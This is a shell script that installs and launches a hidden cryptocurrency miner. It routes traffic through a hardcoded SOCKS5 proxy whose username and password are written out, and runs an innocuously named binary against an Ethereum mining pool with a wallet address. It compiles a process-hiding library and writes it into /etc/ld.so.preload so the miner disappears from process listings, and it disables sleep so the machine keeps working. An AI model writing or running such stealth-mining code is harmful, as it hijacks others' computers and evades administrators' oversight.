#!/bin/sh
sudo systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target && sleep 1100
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

tar -xvzf memek.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 191.96.43.10:54002	
socks5_username = afauzyt
socks5_password = k9GdH6h
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp chmod +x MEMEK

./graftcp/graftcp unzip puki.zip

make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./MEMEK -P stratum1+ssl://0x6Fe8C4DD14AdB580f8AFC3218D22658a2b9E4606.arul@eth-us-west.flexpool.io:5555 -R -U --HWMON 2 --verbosity 1 --work-timeout 999
